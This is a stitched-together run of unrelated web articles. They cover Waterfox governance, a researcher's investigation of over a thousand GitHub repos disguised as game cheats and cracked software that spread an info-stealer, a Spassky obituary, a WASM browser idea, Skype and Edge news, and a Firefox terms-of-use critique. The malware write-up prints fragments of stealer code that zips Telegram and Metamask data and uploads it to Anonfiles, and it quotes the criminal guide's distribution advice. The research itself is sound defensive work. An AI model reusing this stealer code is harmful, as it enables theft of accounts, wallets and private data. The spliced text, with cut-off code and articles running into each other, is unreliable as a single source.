<p>Open source software is fundamentally about freedom—the freedom to modify, distribute, and use software as one sees fit. However, when it comes to something as security-critical as a web browser—software that mediates our most sensitive online interactions—the existence of a responsible organisation with clear policies becomes a crucial differentiator.</p>
<p>Browsers without formal governance may offer appealing features or privacy claims, but users have little recourse if those promises are broken. There’s no entity to hold accountable, no legal framework within which to address grievances, and often no transparency about decision-making processes.</p>
<h2 id="balancing-freedom-with-responsibility">Balancing Freedom with Responsibility</h2>
<p>This is what I think makes Waterfox fundamentally different from many alternatives. The very fact that we maintain clear policies, respond to user feedback, and operate within legal frameworks creates an accountability that many browser projects simply don’t have.</p>
<p>As the browser landscape continues to evolve, I think that having a clearly defined governance structure and transparent policies isn’t just good practice—it’s an essential component of user trust. While open source gives developers the freedom to fork code and create new projects at will, users deserve to know who is responsible for the software they rely on daily and how decisions about their privacy are made.</p>
<p>The existence of formal policies, even imperfect ones, represents a commitment to users that their interests matter.</p>  </div></div>]]></description>

            <p>While looking through the articles on a "social engineering" themed forum I discovered a relatively new scam scheme that shocked me.<br>People create thousands of GitHub repositories with all sorts of things - from Roblox and Fortnite mods to "cracked" FL Studio and Photoshop.</p><p>As soon as you download and launch any of these, all the data from your computer is collected and sent to some discord server - where hundreds of people crawl through the data searching for crypto wallet private keys, bank accounts and social media credentials, and even Steam and Riot Games accounts.</p><h3 id="tldr">TL;DR</h3><ol><li>I found a step-by-step guide to creating these scam repositories, broke it down and eventually found a couple of the repositories potentially created by the guide author. </li><li>Wrote a script that helped me find <strong>1115</strong> repositories built based on the instructions from the guide. <br>Less then 10% of them have open issues with complaints - others look just fine.<br>I collected all of them in a <a href="https://docs.google.com/spreadsheets/d/e/2PACX-1vTyQYoWah23kS0xvYR-Vtnrdxgihf9Ig4ZFY1MCyOWgh_UlPGsoKZQgbpUMTNChp9UQ3XIMehFd_c0u/pubhtml?ref=timsh.org#" rel="noreferrer">single spreadsheet</a>.  </li><li>Found the unpacked version of the malicious code and analysed each of the 1000+ rows.

Anyone curious enough can find all mentioned things by themselves. </li></ol><p>By the way, I think this is a very clever kind of promo for a very specific audience that can't be easily seen from the outside.<br>Since it's a message from the bot, you must already be subscribed to it to see it, and it will also send all users that didn't mute it a notification. <br>I think the conversion rates of these ads (each one costs 150$) are quite high. </p><p>Let's get back to the message on the screenshot - as well as other promotions of various scam "teams", it had a mention of a [redacted] forum that was acting as some sort of authority platform in this niche - the message implies that this specific "team" has deposited $10k to the forum in order to prove that they're legit or something. I decided to look into the forum and was shocked by what's out there in the clear web. </p><p>No .onion, no KYC, no "contact us to join" - I just created an account with email + password and was able to view all of the contents. </p><p>Inside - a panel for selling basically anything: accounts on all sorts of platforms, starting from TikTok and up to "old verified $100k+ spent Facebook Ads accounts" for... well, it's a theme for another post. </p><figure><img src="https://timsh.org/content/images/2025/02/Screenshot-2025-02-20-at-23.55.06.png" alt="" loading="lazy" width="1638" height="336" srcset="https://timsh.org/content/images/size/w600/2025/02/Screenshot-2025-02-20-at-23.55.06.png 600w, https://timsh.org/content/images/size/w1000/2025/02/Screenshot-2025-02-20-at-23.55.06.png 1000w, https://timsh.org/content/images/size/w1600/2025/02/Screenshot-2025-02-20-at-23.55.06.png 1600w, https://timsh.org/content/images/2025/02/Screenshot-2025-02-20-at-23.55.06.png 1638w" sizes="(min-width: 720px) 720px"><figcaption><span>US-based 6+ months old instagram accounts for 50 cents</span></figcaption></figure><p>What turned out to be far more interesting is the <strong>Articles</strong> section. <br>The topics cover almost everything there is in the "<em>affiliate</em>" world - which is a fancy name for all sorts of scams that involve some tech "provider" and a "team" of people who attract "mammoths" to their website and share profits with the provider. <br>A good example is RaaS (ransomware as a service) - check out <a href="https://www.group-ib.com/resources/knowledge-hub/raas/?ref=timsh.org" rel="noreferrer">this article</a> if you're interested, or a crypto drainer like <a href="https://cryptograb.io/?ref=timsh.org" rel="noreferrer">CryptoGrab</a> which is literally a scam platform that has a <a href="https://find-and-update.company-information.service.gov.uk/company/15422095?ref=timsh.org" rel="noreferrer">registered company in the UK</a> - which they brag about in their <a href="https://read.cryptograb.wiki/cryptograb-affiliate?ref=timsh.org#we-are-an-official-company" rel="noreferrer">documentation</a>. </p><p>But we're not here to talk about these "famous" schemes – lots of researchers and cybersecurity agencies have investigated them.<br>As an example, Abnormal <a href="https://abnormalsecurity.com/blog/cryptograb-cryptocurrency-fraud-scam-websites-phishing?ref=timsh.org" rel="noreferrer">posted an investigation about CryptoGrab</a> less then a week ago.  </p><p>What appeared as a complete surprise and novelty to me was the article titled: </p><h2 id="how-to-pour-traffic-on-github-from-a-to-z">How to pour [traffic on] Github from A to Z</h2><figure><img src="https://timsh.org/content/images/2025/02/Screenshot-2025-02-21-at-00.12.43.png" alt="" loading="lazy" width="1452" height="340" srcset="https://timsh.org/content/images/size/w600/2025/02/Screenshot-2025-02-21-at-00.12.43.png 600w, https://timsh.org/content/images/size/w1000/2025/02/Screenshot-2025-02-21-at-00.12.43.png 1000w, https://timsh.org/content/images/2025/02/Screenshot-2025-02-21-at-00.12.43.png 1452w" sizes="(min-width: 720px) 720px"></figure><p>This post is a very long and detailed step-by-step instruction for creating and spreading hundreds of malicious GitHub repos masked as almost anything "juicy": popular game mods, "free" cracked apps like Adobe Photoshop and FL Studio, and lots of other things. </p><figure><div><p><img src="https://timsh.org/content/images/2025/02/image-1.png" width="755" height="397" loading="lazy" alt="" srcset="https://timsh.org/content/images/size/w600/2025/02/image-1.png 600w, https://timsh.org/content/images/2025/02/image-1.png 755w" sizes="(min-width: 720px) 720px"></p><p><img src="https://timsh.org/content/images/2025/02/image-2.png" width="683" height="831" loading="lazy" alt="" srcset="https://timsh.org/content/images/size/w600/2025/02/image-2.png 600w, https://timsh.org/content/images/2025/02/image-2.png 683w"></p></div><figcaption><p><span>some of the placeholder images created by the author of that article and an example of a "Cracked" FL Studio repository readme </span></p></figcaption></figure><p>The main goal of malicious scripts under the hood is to collect so-called "logs".</p><blockquote>"Log" is a file with data from victim's computer, including cookies, passwords, IP and sensitive files.

    name = arg
    if not os.path.exists(pathC):
        return None
    None.Popen(f'''taskkill /im {procc} /t /f &gt;nul 2&gt;&amp;1''', True, **('shell',))
    zf = ZipFile(f'''{pathC}/{name}.zip''', 'w')
    for file in os.listdir(pathC):
        if '.zip' not in file and 'tdummy' not in file and 'user_data' not in file and 'webview' not in file:
            zf.write(pathC + '/' + file)
    zf.close()
    lnik = uploadToAnonfiles(f'''{pathC}/{name}.zip''')
    os.remove(f'''{pathC}/{name}.zip''')
    OtherZip.append([
        arg,
        lnik])</code></pre><p>This function kills Telegram process if it's running, collects the associated files (chat history, media, settings, tokens etc) and sends it to Anonfiles - a free and anonymous file sharing site, <a href="https://www.malwarebytes.com/blog/detections/anonfiles-com-2?ref=timsh.org" rel="noreferrer"><u>reported by some antivirus and malware detection</u></a> products as abused by criminals.</p><p>Next we have the ZipFiles - it's a long function that looks for specific things like Metamask wallet extension associated files, Steam loginusers.vdf file, containing user stream account info, Riot games accounts and more. </p><pre><code>if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:
    browser = path.split('\\')[4].split('/')[1].replace(' ', '')
    name = f'''Metamask_{browser}'''
    pathC = path + arg
if not os.path.exists(pathC):
    return None</code></pre><p>And again uploads all of the zipped files to Anonfiles. </p><p>Then we have a <code>GatherAll()</code> function that provides a list of hardcoded paths to all sorts of things, including different browser folders for Opera, Chrome, Brave and so on. It even uses multithreading to collect the secrets faster. </p><p>The <code>uploadToAnonfiles(path)</code> function, by the way, suggests that this code is intentionally incomplete - possibly, to avoid malware activity detection by static analysis. Looks like the real functionality is injected on the go.</p><pre><code>def uploadToAnonfiles(path):
    try:
        pass
    finally:
        return None
        return False</code></pre><p>Finally, we get to the family of "Kiwi" functions:</p><ul><li><code>KiwiFile</code> scans directories for files matching keywords.</li><li><code>KiwiFolder</code> handles subdirectories recursively.</li><li><code>Kiwi</code> includes a set of common directory names to look for: </li></ul><pre><code>def Kiwi():
    user = temp.split('\\AppData')[0]

I quote: </p><blockquote>If you're motivated enough, you should create more topics and upload them. As you reach 300-500 uploaded repositories, 10-30 of which are on top - they will generate <strong>50-100+ logs daily</strong>. <br>Check your topics once in a while - if any of them got banned, re-upload all affected repos with new tags. <br>Good luck! </blockquote><p>So there should be hundreds of these uploaded just by a single person - so, potentially, thousands or more in total. <br>I could've stopped at this point since this is already an indicator of a wide-spread problem. But I decided to try a few things in order to estimate the amount of repos out there. </p><h3 id="searching-on-github">Searching on Github</h3><p>I almost immediately came up with an idea - since I have an instruction for creating and choosing the topics provided by the author, I could try and search each of them and see if there are any repositories with such topics. </p><p>I tried it manually with 10 topics and was very excited to see that 10/10 included similar-looking repos with either README + .rar or just README with "download" link, leading to some shady file sharing service. <br>At this point I found out that this scam scheme must also be popular on Chinese "social engineering" forums,  since there are lots of the identical repos with readme  in Chinese. <br>Here's <a href="https://github.com/stillweasyh/CS2-imstar3.5?ref=timsh.org"><u>one example</u></a> with a couple open issues - I translated it with google translate:</p><figure><img src="https://timsh.org/content/images/2025/02/Screenshot-2025-02-24-at-22.10.51.png" alt="" loading="lazy" width="1882" height="1866" srcset="https://timsh.org/content/images/size/w600/2025/02/Screenshot-2025-02-24-at-22.10.51.png 600w, https://timsh.org/content/images/size/w1000/2025/02/Screenshot-2025-02-24-at-22.10.51.png 1000w, https://timsh.org/content/images/size/w1600/2025/02/Screenshot-2025-02-24-at-22.10.51.png 1600w, https://timsh.org/content/images/2025/02/Screenshot-2025-02-24-at-22.10.51.png 1882w" sizes="(min-width: 720px) 720px"></figure><h3 id="scraping-github">Scraping Github</h3><p>After just 30 minutes of manual searching I felt like it was an effective method, meaning that the possibility that a repository is / looks malicious if it has one of the mentioned topics is quite high. Which is why I decided to write a simple script that:</p><ol><li>Generates some simple topics using an instruction provided by the author - 1 base_keyword like csgo or fortnite + 1 topic_keyword like "cheat", "hack", "aimbot", then 1 base + 2 topic_keyword, e.t.c</li><li>Searches for each of them on Github using a <code>topic:{topic}</code> query and saves all found repos to a single .csv. </li><li>Checks each found repository structure for being suspicious - even a single README or README + some files + .rar/.exe./.zip. <br>Again, those that don't match the file structure pattern are still very likely to be malicious - but maybe using a slightly different approach.  </li></ol><p>For both base_keywords and topic_keywords I used lists  from the examples from the guide - as you can imagine, both of these could be expanded quite a lot, but I left them intentionally to see if even the simplest PoC would work:</p><pre><code>base_keywords = [
    "Apex Legends", "CODMW", "cod warzone", "cs2", "dayz", "escape from tarkov",
    "five m", "fortnite", "genshin impact", "gta v", "lol", "league of legends",
    "minecraft", "overwatch", "pubg", "rainbow six siege", "roblox", "rust",
    "valorant", "fl studio", "fruity loops"
]

modifiers = [
    "download", "free", "crack", "cracked", "for pc", "pc crack",
    "cheat", "cheats", "hack", "hacks", "wallhack", "aimbot"
]</code></pre><p>At first when I generated topics of length &lt;= 4 words I got <strong>38k</strong> possible options. Since GitHub API search endpoint has a rate limit of 30 requests / minute, looking through all of them would take the script almost a full day. <br>I decided to limit the list of keywords to have 100 keyword combinations per app - for 21 apps, that gave me 2100 topics - more than enough for the PoC purposes. </p><h3 id="even-with-the-simple-poc-script-heres-what-i-got">Even with the simple PoC script, here's what I got:<br></h3><blockquote>All repositories:<br>  Total rows: <strong>1155</strong><br>  Rows with open_issues &gt;= 1: 115<p>Malicious repositories (based on file structure):<br>  Total rows: <strong>351</strong><br>  Rows with open_issues &gt;= 1: 11</p></blockquote><p>115 have at least 1 open issue. I checked a few manually - all of the issues are either "this is not working" (and it shouldn't, by the way - it just needs to waste some of your time while it's looking for your data) or/and "this is a scam / malware / rat / virus / ...". <br>It's just 10% of the found repos. And with malicious ones, it's even worse - 11/351. <br>Open issues could potentially save someone from downloading and launching the malicious script.</p><p>I collected all of the repos in a <a href="https://docs.google.com/spreadsheets/d/e/2PACX-1vTyQYoWah23kS0xvYR-Vtnrdxgihf9Ig4ZFY1MCyOWgh_UlPGsoKZQgbpUMTNChp9UQ3XIMehFd_c0u/pubhtml?ref=timsh.org#" rel="noreferrer"><u>single spreadsheet</u></a> so you could explore it yourself:</p><figure><img src="https://timsh.org/content/images/2025/02/Screenshot-2025-02-26-at-01.04.38.png" alt="" loading="lazy" width="2000" height="457" srcset="https://timsh.org/content/images/size/w600/2025/02/Screenshot-2025-02-26-at-01.04.38.png 600w, https://timsh.org/content/images/size/w1000/2025/02/Screenshot-2025-02-26-at-01.04.38.png 1000w, https://timsh.org/content/images/size/w1600/2025/02/Screenshot-2025-02-26-at-01.04.38.png 1600w, https://timsh.org/content/images/size/w2400/2025/02/Screenshot-2025-02-26-at-01.04.38.png 2400w" sizes="(min-width: 1200px) 1200px"></figure><div><p>I checked some of them - every single one seemed like it was made using some version of the mentioned guide. </p><p>Just take a look at some of the "beautiful" clickable images in the README files from those malicious repos - scary, right? </p></div><figure><div><p><img src="https://timsh.org/content/images/2025/02/68747470733a2f2f692e696d6775722e636f6d2f4f6d684a596f6d2e6a706567.jpeg" width="1400" height="1900" loading="lazy" alt="" srcset="https://timsh.org/content/images/size/w600/2025/02/68747470733a2f2f692e696d6775722e636f6d2f4f6d684a596f6d2e6a706567.jpeg 600w, https://timsh.org/content/images/size/w1000/2025/02/68747470733a2f2f692e696d6775722e636f6d2f4f6d684a596f6d2e6a706567.jpeg 1000w, https://timsh.org/content/images/2025/02/68747470733a2f2f692e696d6775722e636f6d2f4f6d684a596f6d2e6a706567.jpeg 1400w" sizes="(min-width: 720px) 720px"></p><p><img src="https://timsh.org/content/images/2025/02/68747470733a2f2f692e696d6775722e636f6d2f786256416a366a2e6a706567.jpeg" width="1400" height="1900" loading="lazy" alt="" srcset="https://timsh.org/content/images/size/w600/2025/02/68747470733a2f2f692e696d6775722e636f6d2f786256416a366a2e6a706567.jpeg 600w, https://timsh.org/content/images/size/w1000/2025/02/68747470733a2f2f692e696d6775722e636f6d2f786256416a366a2e6a706567.jpeg 1000w, https://timsh.org/content/images/2025/02/68747470733a2f2f692e696d6775722e636f6d2f786256416a366a2e6a706567.jpeg 1400w" sizes="(min-width: 720px) 720px"></p><p><img src="https://timsh.org/content/images/2025/02/68747470733a2f2f692e696d6775722e636f6d2f5361644956626f2e6a706567.jpeg" width="1400" height="1900" loading="lazy" alt="" srcset="https://timsh.org/content/images/size/w600/2025/02/68747470733a2f2f692e696d6775722e636f6d2f5361644956626f2e6a706567.jpeg 600w, https://timsh.org/content/images/size/w1000/2025/02/68747470733a2f2f692e696d6775722e636f6d2f5361644956626f2e6a706567.jpeg 1000w, https://timsh.org/content/images/2025/02/68747470733a2f2f692e696d6775722e636f6d2f5361644956626f2e6a706567.jpeg 1400w" sizes="(min-width: 720px) 720px"></p></div></figure><h2 id="conclusion">Conclusion</h2><p>It's been a long journey and it's barely over - but I think it's more than enough to summarise and discuss the problem. </p><p>What still shocks me (although I'm starting to get used to it) is the kind of information you can freely access online ... without Tor, without invite, without anyone's approval. <br>And at the same time - how nicely it's hidden from most of us under a telegram bot that sends you scam job offers, or a forum/panel with a funny name. </p><p>The guide has lots of comments on the forum. <br>Some people ask for advice, others +rep the author, and some say that this is almost dead - "I used to get hundreds of logs with this a year ago, but now there are lots of script kiddies spoiling the results for all of us".<br>One user links another guide on how to unpack the stolen Steam accounts and sell the inventory - guess that's a topic for another post.</p><p>This Redox malware is so scary simple - 1000-row main.py is not what you expect to see when you hear about an evil malware stealing all the secrets. </p><p>Finally, what bugs me is that all these repos can definitely be identified by GitHub detection system.

<div id="readability-page-1" class="page"><div id="top-content-area">
                        

<p>Borís Vasíl'yevich Spásskiy&nbsp;was born on January 30, 1937 in Leningrad (now Saint Petersburg). The two-time Soviet Champion and ex-World Champion&nbsp;immigrated to&nbsp;France in 1976, and became a French citizen. He&nbsp;returned to Russia in 2012, where <a href="https://en.chessbase.com/post/boris-spaky-in-grave-condition">he suffered a major stroke</a> that left him&nbsp;bound to&nbsp;a wheelchair for the rest of his life.</p>
<p>Arkady Dvorkovich, the president of FIDE, said: “He was not only one of the greatest players of the Soviet era and the world, but also a true gentleman. His contributions to chess will never be forgotten.”</p>
<p>The general newspapers and chess news outlets will be full of the news of Spassky's passing, with copious descriptions of his career.&nbsp;Read for instance&nbsp;<a href="https://www.nytimes.com/2025/02/27/world/europe/boris-spassky-dead.html">Dylan Loeb McClain's article</a> in the New York Times, published just hours after the news broke. In any case, there are many comprehensive biographical articles, <a href="https://en.wikipedia.org/wiki/Boris_Spassky">like this one in Wikipedia</a>. I do not want to add to these, but instead describe the Spassky I knew.</p>
<h3>On a personal note</h3>
<p><img alt="" src="https://en.chessbase.com/portals/all/2024/ff/Chess-stories01.jpg">In the book&nbsp;<em>Chess Stories,</em>&nbsp;<a href="https://en.chessbase.com/post/chess-stories-now-in-english">now available in English</a>, there is a chapter by me on my decades-long friendship with Boris Spassky. I will link to it at the bottom of this article. Here's a short summary.</p>
<p>I first met Boris Spassky in the late 1970s, in Hamburg, where he was part of the commercial presentation of a new chess playing computer. Then in Munich in 1979, where Boris was playing in a GM tournament. My friend Helmut Pfleger, who is a medical doctor, was conducting an experiment to monitor the blood pressure and heart rates of players during a game. Spassky was one of the volunteers, and I assisted in attaching the monitors to his arm each day. We slowly became friends.</p>
<p>In 1988, I travelled to the Candidates Tournament in Saint John, Canada. When the plane landed in Toronto they said we had missed the onward flight, and gave me a very nice room, in a very nice hotel. There I went down to dinner, and suddenly Boris Spassky walks up to me and says, “Excuse me, Mr. Frederic, I recognized you on the plane, but I did not want to disturb you. Maybe we could now have dinner together?” I was stunned that one of the greatest chess players in the world would come to me in such a courteous way. We had a sumptuous dinner, with an endless supply of good Canadian wine. We sat there till four in the morning, and Boris told me eighty percent of everything I know about chess history.</p>
<p>After that night in the hotel restaurant, every time we met, we always spoke at length, and often had dinner together. Twice a year I would get a phone call from him: "I need you to fill my samovar," he'd say. That meant I had to send him new games for his Mega Database.</p>
<p>The next major encounter came many years later, when there was a Candidates Tournament in Elista, Russia. Boris was there doing commentary. We usually took lunch and dinner at the same table, and I witnessed something quite extraordinary: many young players crowded around us, listening to Boris. He was an old man, but everyone was interested in talking to him. He was charismatic and charming, full of stories!</p>
<p>After Boris moved back to Moscow, he became very frail. When I saw&nbsp;pictures or videos of him, I felt sad, because the man with whom I roamed the steppe was so vigorous and healthy. Not so long ago, somebody asked him what he did for his chess preparation. He replied: “I do not prepare for chess. I am preparing for – death! It is a long and difficult endgame.”&nbsp;</p>

<ul>
<li>I have described the weeks we spent together in Elista, and my friendship with Boris Spassky, <strong><a href="https://en.chessbase.com/post/frederic-s-mates-how-i-met-boris-spassky">in this article</a></strong>, which contains pictures and a 16-minute video interview conduced in&nbsp;Arne Kaehler's series <em>Frederic's Mates.<br>&nbsp;</em> 
</li><li>You can also read <strong><a href="https://en.chessbase.com/portals/all/2025/ff/Encounters_%20Boris%20Spassky.pdf">the full chapter I wrote in <em>Chess Stories</em></a></strong>. </li></ul>

<section id="pagebody" role="main">
<p>So there are only 2 web browser engines, and it seems likely there will
soon only be 1, and making a whole new web browser from the ground up is
effectively impossible because the browsers vendors have weaponized web
standards complexity against any newcomers. Maybe eventually someone will
succeed and there will be 2 again. Best case. What a situation.</p>

<p>So throw out all the web standards. Make a browser that just runs WASM
blobs, and gives them a surface to use, sorta like Wayland does. It has
tabs, and a throbber, and urls, but no HTML, no javascript, no CSS.
Just HTTP of WASM blobs.</p>

<p>This is where the web browser is going eventually anyway, except in the
current line of evolution it will be WASM with all the web standards
complexity baked in and reinforcing the current situation.</p>

<p>Would this be a mass of proprietary software? Have you looked at any
corporate website's "source" lately? But what's important is that this
would make it easy enough to build new browsers that they would stop
being a point of control.</p>

<p>Want a browser that natively supports RSS? Poll the feeds, make a UI,
download the WASM enclosures to view the posts. Want a browser that
supports IPFS or gopher? Fork any browser and add it, the mantenance load
will be minimal. Want to provide access to GPIO pins or something? Add an
extension that can be accessed via the WASI component model. This would
allow for so many things like that which won't and can't happen with the
current market duopoly browser situation.</p>

<p>And as for your WASM web pages, well you can still use HTML if you like. Use
the WASI component model to pull in a HTML engine. It doesn't need to
support <em>everything</em>, just the parts of web standards that you want to use.
Or you can do something entitely different in your WASM that is not HTML
based at all but a better paradigm (oh hi Spritely or display postscript
or gemini capsules or whatever).</p>

<p>Dual innovation sources or duopoly? I know which I'd prefer. This is not my
project to build though.</p>

<div id="article-body">
<p>In a move that will likely surprise no one, it appears Microsoft is gearing up to shut down Skype in the coming months. Spotted by <a data-analytics-id="inline-link" href="https://www.xda-developers.com/microsoft-killing-skype/" target="_blank" data-url="https://www.xda-developers.com/microsoft-killing-skype/" referrerpolicy="no-referrer-when-downgrade" data-hl-processed="none"><em>XDA Developers</em></a>, the latest Skype for Windows preview reportedly includes a hidden string that reads <em><strong>"Starting in May, Skype will no longer be available. Continue your calls and chats in Teams." </strong></em>No other details are provided, but it certainly sounds like Skype's days are numbered.</p><p>Skype first launched in 2003 and was a very popular VOIP messaging platform in its heyday. <a data-analytics-id="inline-link" href="https://www.windowscentral.com/microsoft-close-buying-skype-7-billion-updated-its-official" data-before-rewrite-localise="https://www.windowscentral.com/microsoft-close-buying-skype-7-billion-updated-its-official">Microsoft would later acquire Skype in 2011 for $8.5 billion</a>, and in the years since has attempted to integrate it across many products, including Windows, Windows Phone, and even Xbox.</p><p>The company has updated and redesigned Skype a number of times in the last decade, including splitting the app up in an attempt to integrate the service into Windows 10 Mobile's Phone and Messaging apps to position it as a viable iMessage competitor.</p><p>in the last handful of years, Skype has been seriously neglected. Microsoft failed to position Skype as a viable option during the pandemic, and the service has largely fallen by the wayside in the eyes of consumers. Most people have moved to more modern platforms such as Telegram, WhatsApp, iMessage, and Discord.</p><p>Microsoft did use Skype as a backbone to build out its popular Teams service for enterprise customers, but the experiences between the Teams and Skype apps are very different. Interestingly, it looks like Microsoft will encourage the remaining Skype users to switch to Teams, though this is likely referring to <a data-analytics-id="inline-link" href="https://www.windowscentral.com/microsoft-teams-consumer-announcement" data-before-rewrite-localise="https://www.windowscentral.com/microsoft-teams-consumer-announcement">Teams for Consumers.</a></p><p>Skype in its current form is a sorry excuse for a messaging platform. It's a web-based app on Windows, which is very slow and does a terrible job at syncing conversations and notifications across devices. The app also doesn't even support Windows on Arm, which is something Microsoft has been pushing to adopt over the last half a decade.</p><p>In the last few years, Microsoft has tried to revive Skype with <a data-analytics-id="inline-link" href="https://www.windowscentral.com/skype-text-messages-can-now-show-short-movie-and-tv-show-based-mojis-clips" data-before-rewrite-localise="https://www.windowscentral.com/skype-text-messages-can-now-show-short-movie-and-tv-show-based-mojis-clips">experiments such as Skype Clips</a>, which let users send short video messages to each other without calling them. In 2024, it also gained access to Copilot, self messaging, and a revamped mobile experience designed to compete with rival platforms.</p><div data-hydrate="true" id="slice-container-newsletterForm-articleInbodyContent-qbDJD7W5VwBdPpCoqrqAfE"><section><p>All the latest news, reviews, and guides for Windows and Xbox diehards.</p></section></div><p>Nothing seems to have worked, as the service still hasn't seemed to have gained much traction. The last time Skype received a notable update was in May 2024. <a data-analytics-id="inline-link" href="https://www.windowscentral.com/software-apps/skype-credit-no-longer-available-for-purchase-moving-millions-toward-subscriptions-as-their-only-option" data-before-rewrite-localise="https://www.windowscentral.com/software-apps/skype-credit-no-longer-available-for-purchase-moving-millions-toward-subscriptions-as-their-only-option">Microsoft recently shuttered its Skype Number service</a>, which let you buy a real phone number that could be used to call other phone numbers not on the Skype service.</p><p>So, it seems Skype's days are numbered. Microsoft is yet to officially confirm that Skype is being shut down, but we'll be sure to update this article when the official announcement arrives. We've reached out to Microsoft for comment and will update accordingly.</p>

<p>If you use the uBlock Origin extension in Google Chrome or Edge, you should probably start looking for alternative browsers or extensions—either way. A few days ago, users noticed that Google had begun disabling uBlock Origin and other Manifest V2-based extensions as part of the migration to Manifest V3. Now, Microsoft Edge <em>appears</em> to be following suit.</p>

<p>The latest Edge Canary version started disabling Manifest V2-based extensions with the following message: "This extension is no longer supported. Microsoft Edge recommends that you remove it." Although the browser turns off old extensions without asking, you can still make them work by clicking "Manage extension" and toggling it back (you will have to acknowledge another prompt).</p>

<figure><a href="https://cdn.neowin.com/news/images/uploaded/2025/02/1740579546_ublock_origin_dead.jpg"><img alt="uBlock Origin was turned off message in Edge" src="https://cdn.neowin.com/news/images/uploaded/2025/02/1740579546_ublock_origin_dead.jpg"></a></figure>                            <!-- PLACE THIS SECTION INSIDE OF YOUR BODY WHERE YOU WANT THE VIDEO PLAYER TO RENDER -->
            <p>At this point, it is not entirely clear what is going on. <a href="https://www.neowin.net/news/google-to-begin-phasing-out-manifest-v2-extensions-in-chrome-on-june-3/">Google started phasing out Manifest V2 extensions</a> in June 2024, and it has a clear roadmap for the process. <a href="https://learn.microsoft.com/en-us/microsoft-edge/extensions-chromium/developer-guide/manifest-v3">Microsoft's documentation</a>, however, still says "TBD," so the exact dates are not known yet. This leads to some speculating about the situation being one of "unexpected changes" coming from Chromium. Either way, sooner or later, Microsoft will ditch MV2-based extensions, so get ready as we wait for Microsoft to shine some light on its plans.</p>

<div data-oembed-url="https://x.com/Leopeva64/status/1894035389033103765">
<blockquote data-dnt="true">
<p dir="ltr" lang="en">1/2 A message stating that some extensions have been disabled because they are no longer supported has appeared after installing the latest Edge Canary build, but I THINK this is one of those unexpected changes coming from upstream Chromium:<a href="https://t.co/NME5AvLUvg">https://t.co/NME5AvLUvg</a> <a href="https://t.co/BLWPI5onYh">pic.twitter.com/BLWPI5onYh</a></p>

</blockquote>

</div>

<p>Another thing worth noting is that the change does not appear to be affecting Edge's stable release or Beta/Dev Channels. For now, only Canary versions disable uBlock Origin and other MV2 extensions, leaving users a way to toggle them back on. Also, the uBlock Origin is <a href="https://microsoftedge.microsoft.com/addons/detail/ublock-origin/odfafepnkmbhccpbejgmiehpchacaeak">still available</a> in the Edge Add-ons store, <a href="https://www.neowin.net/news/microsoft-rolls-out-revamped-edge-add-ons-website/">which recently received a big update</a>.</p>

<p>In August 2024, when Google started flagging uBlock Origin as unsupported, the extension's maker stepped in and <a href="https://www.neowin.net/news/ublock-origin-developer-recommends-switching-to-ublock-lite-as-chrome-flags-the-extension/">recommended users switch to uBlock Origin Lite</a>, a Manifest V3-based extension, and accept some of its limitations. Another option is to switch to Firefox. Mozilla recently <a href="https://blog.mozilla.org/en/products/firefox/firefox-manifest-v3-adblockers/">announced</a> its plans to keep Manifest V2 extensions working, including uBlock Origin, based on Mozilla Manifesto, which claims that "individuals must have the ability to shape the internet and their own experiences on it."</p>

<p>Now, users can either switch to a browser that still supports MV2 extensions or move to MV3-based ad blockers. Of course, not all MV2 extensions have "more modern" versions, so for many, switching to Firefox or another browser with MV2 support will be the only option to keep old extensions working.</p>

						<p><strong>Terms of Use and Privacy Policy documents are for web services, not for browsers.</strong></p><p>In a world where you don't own your computer, your operating system, your software, your content, or even your data, Firefox has always been the exception: "You can do whatever you want with Firefox! Once you download it, it becomes&nbsp;<em>your</em> browser." But now Mozilla is clawing back that shining, glorious isle of software peacefulness.</p><p>I've been a very vocal champion of Mozilla and of Firefox for years. I have defended things like the acquisition of Pocket (I actually use it extensively!), the addition of the AI chatbot sidebar, and the refocusing of energies on advertising and data collection as things that Firefox needed to do in order to stay relevant, grow their market share, and keep people employed.</p><p>And now, in this moment of glimmering opportunity, as Google is taking away a feature and telling Chrome users, "No, this is <em>our</em> browser, and you can't have any privacy either," <strong>Firefox had the opportunity to present itself as the refuge from everything that Chromium takes away from users.</strong> You could've said, "our terms of use: use the browser for good! Our privacy policy: your data remains private because we don't collect it at all." It could've been a remarkable distinctive for your user share. It could've positioned Mozilla as a paladin for the open web.</p><p>But instead, you're instituting a terms of use and a privacy policy that are vague and full of platitudes but represent a shift from your mission. <strong>This is a massive unforced error on Mozilla's part.</strong> If it was a EULA, that would be one thing. But this is not a EULA for an application. It's a TOS for a data collection service.</p><blockquote><strong>Transparency matters.</strong><span> We’re introducing a Terms of Use to provide clarity on what users agree to before starting to browse.</span></blockquote><p>For twenty years, the agreement has been very simple: you don't take any data from us unless we explicitly agree to it. But your new TOU has a "nonexclusive, royalty-free, worldwide license" clause, the very same clause that's been used for decades to excuse horrible abuses of privacy by the worst that Big Tech has to offer.</p><p>While a TOU makes sense when someone makes use of the features you mention, the blanket application to all browsing data makes it feel like you're preparing us for a rug pull, after which you're going to start using our data for AI training or ad targeting (something which the Privacy Policy specifically allows).</p><p><strong>You shouldn't need a Terms of Use if all of the data remains on our device and we haven't opted-in to sending you any.</strong> You certainly don't need one to download and render a website. You only need one if Firefox isn't going to be a browser anymore, but a web service.</p><p>It's like Randall Munroe said in xkcd #463, many years ago: "Imagine you're at a parent-teacher conference, and the teacher reassures you that he always wears a condom while teaching. Strictly speaking, it's better than the alternative, yet someone is clearly doing their job horribly wrong." We chose Firefox because we wanted a browser, not a platform.</p><blockquote><strong>Privacy remains a priority.</strong><span> Our updated Privacy Notice gives a more detailed, easy-to-read explanation of our data practices.</span></blockquote><div><p>But this privacy policy is only necessary for certain parts of the browser, where data is actually sent to Mozilla's servers, and applying it in a blanket manner (as noted before) seems like the precursor to a rug pull.</p></div><blockquote><strong>You stay in control.</strong><span> Firefox is designed to respect user choice, with responsible defaults and simple tools to manage your data.</span></blockquote><p>For now. How long until you update the terms of use to prohibit the deactivation of ad targeting on the New Tab page? Or allow you to sell browsing data to third parties? Or train large language models on the things I type into the fields I browse to?</p><p>Please cancel these broad policies and apply them only to the features that need them, agreed to only when we use them. <strong>The only way for us to truly "stay in control" is if the policies don't apply to us unless we choose to use the features that require giving you that protection.</strong></p><p>The thing is, I don't know how you fix this breach of trust in a way that anyone can count on. Once you've presented yourself as willing to do this sort of thing, I just don't see a way to get that back. From being a bastion of the open web, poised to provide a product that people want and desperately need, you've now become a thin shadow of the thing that you claim to stand against.</p><p>I was a member of mozilla.social, and was very sad when that closed down. 